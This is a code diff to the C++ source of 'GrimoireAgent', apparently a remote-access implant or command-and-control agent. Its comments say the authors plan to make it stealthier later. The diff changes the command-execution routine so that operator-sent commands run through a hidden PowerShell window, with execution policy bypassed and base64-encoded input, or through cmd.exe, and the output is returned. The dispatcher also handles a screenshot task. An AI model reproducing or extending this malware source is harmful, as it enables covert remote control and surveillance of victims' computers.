@@ -36,51 +36,51 @@ GrimoireAgent::GrimoireAgent() {
 // ----------------------------------------------------
 // 任务处理：命令执行 (Command Execution)这是最不隐蔽的方式，非常的西巴，掩蔽的方式以后实现
 // ----------------------------------------------------
-std::string GrimoireAgent::ExecuteCommand(const std::string& command) {
-#ifdef _WIN32
-    // Windows API 实现：使用 popen / _popen 代替 system，以捕获输出
 
-    std::string result = "";
-    // 缓冲区大小
-    char buffer[128];
+std::string GrimoireAgent::ExecuteCommand(const std::string& command, const std::string& shellType) {
+    std::string finalCommand;
 
-    // 使用 _popen 执行命令并读取输出
-    FILE* pipe = _popen(command.c_str(), "r");
-    if (!pipe) {
-        return "ERROR: Failed to run command.";
-    }
+    #ifdef _WIN32
+        if (shellType == "powershell")
+        {
+            // 使用 -EncodedCommand 可以直接接收 Unicode Base64 字符串
+            // 这样可以完美避开所有特殊字符转义问题
+            finalCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + command;
+        }else {
+            // CMD 依然保持原样，直接执行
+            finalCommand = "cmd.exe /c " + command;
+        }
+    #else
+        // Linux 下保持简单
+        finalCommand = command;
+    #endif
 
-    // 逐行读取输出
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-        result += buffer;
-    }
+        std::string result = "";
+        char buffer[128];
 
-    _pclose(pipe); // 关闭管道
+        // 加上 2>&1 捕获错误，确保“查无此命令”也能返回给前端
+        std::string redirectCmd = finalCommand + " 2>&1";
+
+    #ifdef _WIN32
+        FILE* pipe = _popen(redirectCmd.c_str(), "r");
+    #else
+        FILE* pipe = popen(redirectCmd.c_str(), "r");
+    #endif
+
+        if (!pipe) return "ERROR: Failed to open pipe.";
+
+        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+            result += buffer;
+        }
+
+    #ifdef _WIN32
+        _pclose(pipe);
+    #else
+        pclose(pipe);
+    #endif
+
     return result;
-
-#else
-    // Linux/macOS 实现：使用 popen 代替 system，以捕获输出
-    std::string result = "";
-    // 缓冲区大小
-    char buffer[128];
-    FILE* pipe = popen(command.c_str(), "r");
-    if (!pipe) {
-        return "ERROR: Failed to run command via popen.";
-    }
-
-    // 逐行读取输出
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-        result += buffer;
-    }
-
-    if (pclose(pipe) == -1) {
-        return result + " (WARNING: pclose error)";
-    }
-
-    return result;
-#endif
 }
-
 
 // ----------------------------------------------------
 // 任务处理：截屏 (Screenshot) 及其不隐蔽，掩蔽的太难写了，要调用DXGI
@@ -206,17 +206,17 @@ std::vector<unsigned char> GrimoireAgent::ProcessTask(const std::vector<unsigned
 
         // 2. 任务分发 (Dispatch based on command_type)
         if (command_type == "shell" || command_type == "whoami") {
-            // shell 任务的参数就是 argument，如果 command_type 是 whoami，argument 则为空
-            std::string cmd_to_run = (command_type == "whoami") ? "whoami" : argument;
+            // shell 任务的参数就是 argument
+            std::string cmd_to_run =  argument;
 
             if (cmd_to_run.empty()) {
                  result_str = "ERROR: Shell command task requires an argument.";
             } else {
-                 result_str = ExecuteCommand(cmd_to_run); // 使用 ExecuteCommand 执行
+                 result_str = ExecuteCommand(cmd_to_run, command_type); // 使用 ExecuteCommand 执行
             }
             result_bytes.assign(result_str.begin(), result_str.end());
 
-        } else if (command_type == "screenshot") {
+        }else if (command_type == "screenshot") {
             // 截屏任务，可以忽略 argument 或用于指定格式/显示器
             result_bytes = TakeScreenshot();
 
